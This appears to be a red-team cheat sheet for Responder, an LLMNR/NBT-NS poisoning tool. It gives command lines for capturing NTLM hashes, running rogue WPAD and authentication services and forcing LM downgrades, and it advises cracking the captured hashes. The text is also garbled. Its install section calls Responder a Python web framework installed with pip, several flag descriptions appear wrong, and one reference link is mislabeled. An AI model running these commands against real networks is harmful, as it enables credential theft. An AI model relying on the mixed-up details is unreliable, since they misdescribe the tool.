# Responder🕵️‍♂️🔗
#Tool #RED #TTAD 

Responder is a powerful tool used for capturing network credentials and performing Man-in-the-Middle (MITM) attacks in internal networks. This guide will help you unleash Responder’s full potential! 🚀

**LINK TO TOOL DOCUMENTATION[ HERE](https://www.kali.org/tools/responder/)**

**Responder** is a tool for exploiting network services like LLMNR, NBT-NS, and MDNS to intercept network authentication requests. It is commonly used for network penetration testing.

---
![responder](https://www.kali.org/tools/responder/images/responder-logo.svg)

---

### 🛠 Features:
- Capture NTLM hashes.
- Perform MITM attacks.
- Redirect SMB and HTTP authentication requests.
- Lightweight and easy to use.

---
### Installing Responder

Responder is a fast and minimalistic web framework for Python. Follow these simple steps to install it:

#### Prerequisites
Ensure you have Python installed (preferably Python 3.7+). You can check your version with:

```sh
python --version
```

#### Installation
Install Responder using pip:

```sh
pip install responder
```

---

## 🧰 Common Commands

### 🔍 Start Responder
```bash
sudo responder -I eth0
```
Start Responder on a specific network interface.

### 📡 Enable Specific Services
```bash
sudo responder -I eth0 -w -r -f
```
Enable WPAD, rogue authentication, and fingerprinting services.

### 🔒 Disable Specific Services
```bash
sudo responder -I eth0 -dw
```
Disable WPAD while running Responder.

### 📜 Save Logs to a Custom Directory
```bash
sudo responder -I eth0 -l /path/to/logs
```
Specify a custom directory to save log files.

---

## ⚙️ Advanced Usage

### 🌐 Analyze Network Traffic Only
```bash
sudo responder -I eth0 -A
```
Run Responder in Analyze mode to passively monitor traffic.

### 🚀 Redirect Authentication Requests
```bash
sudo responder -I eth0 --lm
```
Force victims to authenticate using legacy LM hashes.

### 📂 Specify Custom Responder Config File
```bash
sudo responder -I eth0 -c /path/to/Responder.conf
```
Use a custom configuration file for advanced customization.

### 🧹 Clear Log Files
```bash
sudo responder -I eth0 -F
```
Delete all old log files before starting.

---

## 📋 Handy Options

| Option          | Description                                             |
|-----------------|---------------------------------------------------------|
| `-I`            | Specify the network interface to listen on              |
| `-A`            | Analyze mode (no rogue responses)                      |
| `-w`            | Enable WPAD rogue authentication                       |
| `-r`            | Enable rogue authentication                            |
| `-f`            | Fingerprint hosts                                      |
| `-d`            | Disable specific services (e.g., WPAD)                 |
| `-c`            | Specify custom Responder config file                   |
| `-F`            | Clear log files                                        |
| `-l`            | Save logs to a specific directory                      |
| `--lm`          | Force LM authentication                                |

---

## 🌐 Example Scenarios

### Scenario 1: Basic Credential Capture
```bash
sudo responder -I eth0
```
Intercept and capture credentials on the local network.

### Scenario 2: Passive Traffic Analysis
```bash
sudo responder -I eth0 -A
```
Analyze network traffic without sending rogue responses.

### Scenario 3: Custom Configuration
```bash
sudo responder -I eth0 -c /path/to/custom.conf
```
Run Responder with a custom configuration file.

---

## 🚀 Pro Tips

### 1️⃣ Combine with Crack Tools
After capturing hashes, use tools like **Hashcat** or **John the Ripper** to crack them.

### 2️⃣ Disable Unnecessary Services
Reduce noise by disabling unused Responder services, such as WPAD (`-dw`).

### 3️⃣ Automate Responder Logs
Automate the parsing of Responder logs to streamline post-capture analysis.

---

## 📚 References
- [Responder GitHub Repository](https://github.com/SpiderLabs/Responder)
- [LLMNR and NBT-NS Exploitation Guide](https://owasp.org/www-project-vulnerable-web-applications-directory/)

---

